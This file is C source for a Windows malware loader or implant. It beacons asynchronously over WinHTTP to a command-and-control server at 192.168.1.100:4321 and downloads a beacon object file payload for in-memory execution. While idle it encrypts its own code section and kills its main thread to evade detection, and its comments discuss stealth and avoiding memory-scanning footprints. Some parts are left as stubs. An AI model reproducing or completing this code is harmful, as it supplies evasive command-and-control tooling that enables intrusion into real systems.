#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

// -----------------------------------------------------------------------------
// FORWARD DECLARATIONS
// -----------------------------------------------------------------------------
__declspec(code_seg(".stub")) 
void CALLBACK IocpWakeupCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength);

__declspec(code_seg(".stub"))
void LockAndHibernate();

__declspec(code_seg(".stub"))
void UnlockAndExecute(LPVOID pBofBuffer, DWORD dwBofSize); // We will define this later

// -----------------------------------------------------------------------------
// ASYNC BEACON PRIMITIVE
// -----------------------------------------------------------------------------
BOOL StartAsyncBeacon() {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                     WINHTTP_NO_PROXY_NAME, 
                                     WINHTTP_NO_PROXY_BYPASS, 
                                     WINHTTP_FLAG_ASYNC); // <- Delegate wait to the kernel
    if (!hSession) return FALSE;

    // Register the IOCP callback (triggered when the kernel receives network events)
    WinHttpSetStatusCallback(hSession, 
                             (WINHTTP_STATUS_CALLBACK)IocpWakeupCallback, 
                             WINHTTP_CALLBACK_FLAG_ALL_COMPLETIONS, 
                             0);

    // Connect to C2
    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.1.100", 4321, 0);
    if (!hConnect) return FALSE;

    // Prepare the GET request for the BOF
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/bof", 
                                            NULL, WINHTTP_NO_REFERER, 
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                            WINHTTP_FLAG_SECURE); // Use HTTPS
    if (!hRequest) return FALSE;

    // Send the request. This returns immediately. Network I/O is handled by the Kernel.
    // Note: We can pass a custom struct via dwContext (the 5th parameter) to maintain 
    // our download buffer state across multiple asynchronous callback triggers.
    BOOL bResult = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    
    return bResult;
}

// -----------------------------------------------------------------------------
// MAIN ENTRY POINT (.text section - will be encrypted)
// -----------------------------------------------------------------------------
int main() {
    // 1. Launch the async network primitive.
    // The OS takes over C2 communication from here.
    if (!StartAsyncBeacon()) {
        // Exit stealthily if the network initialization fails.
        return -1; 
    }

    // 2. The request is in flight. The C2 will respond.
    // We do not wait here! We transfer execution to the .stub section.
    // This function will encrypt the .text section and kill this main thread.
    LockAndHibernate();

    // 3. Unreachable code.
    // The main thread is dead. The process is sleeping, managed solely by Kernel IOCP.
    return 0;
}

// -----------------------------------------------------------------------------
// THE WATCHMAN (.stub section - remains unencrypted / RX)
// -----------------------------------------------------------------------------
__declspec(code_seg(".stub")) 
void CALLBACK IocpWakeupCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength) {
    
    // We use a static or context-passed buffer to accumulate the BOF payload
    // across multiple asynchronous read operations.
    static LPVOID pDownloadBuffer = NULL; 
    static DWORD dwTotalDownloaded = 0;
    DWORD dwBytesAvailable = 0;

    // The WinHTTP Event State Machine
    switch (dwInternetStatus) {

        case WINHTTP_CALLBACK_STATUS_SENDREQUEST_COMPLETE:
            // The request was successfully sent to the C2.
            // We now instruct the kernel to wait for the HTTP response headers.
            WinHttpReceiveResponse(hInternet, NULL);
            break;

        case WINHTTP_CALLBACK_STATUS_HEADERS_AVAILABLE:
            // The server responded and headers are parsed.
            // We ask the kernel how much data (payload) is currently available to read.
            WinHttpQueryDataAvailable(hInternet, NULL);
            break;

        case WINHTTP_CALLBACK_STATUS_DATA_AVAILABLE:
            // The kernel tells us how many bytes are ready to be read.
            dwBytesAvailable = *((LPDWORD)lpvStatusInformation);

            if (dwBytesAvailable == 0) {
                // No more data available. The download is complete!
                // The BOF is fully in our buffer. 
                // Now, we must decrypt the .text section and execute the payload.
                UnlockAndExecute(pDownloadBuffer, dwTotalDownloaded);
                
                // Cleanup HTTP handles here...
                WinHttpCloseHandle(hInternet);
            } else {
                // Data is available. Allocate or resize our buffer.
                // In a real S-tier scenario, avoid basic malloc (MEM_PRIVATE footprint).
                // Use a pre-allocated region or a custom memory manager.
                if (!pDownloadBuffer) {
                    pDownloadBuffer = VirtualAlloc(NULL, dwBytesAvailable, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                } else {
                    // Reallocation logic goes here... (simplified for the snippet)
                }

                // Instruct the kernel to read the data chunk asynchronously into our buffer.
                WinHttpReadData(hInternet, (LPBYTE)pDownloadBuffer + dwTotalDownloaded, dwBytesAvailable, NULL);
            }
            break;

        case WINHTTP_CALLBACK_STATUS_READ_COMPLETE:
            // A chunk of data has been successfully written to our buffer.
            dwTotalDownloaded += dwStatusInformationLength;

            // Ask the kernel if there is more data remaining in the socket stream.
            // This loops back to WINHTTP_CALLBACK_STATUS_DATA_AVAILABLE.
            WinHttpQueryDataAvailable(hInternet, NULL);
            break;
            
        case WINHTTP_CALLBACK_STATUS_REQUEST_ERROR:
            // Handle network timeouts, connection drops, etc.
            WinHttpCloseHandle(hInternet);
            break;
    }
}
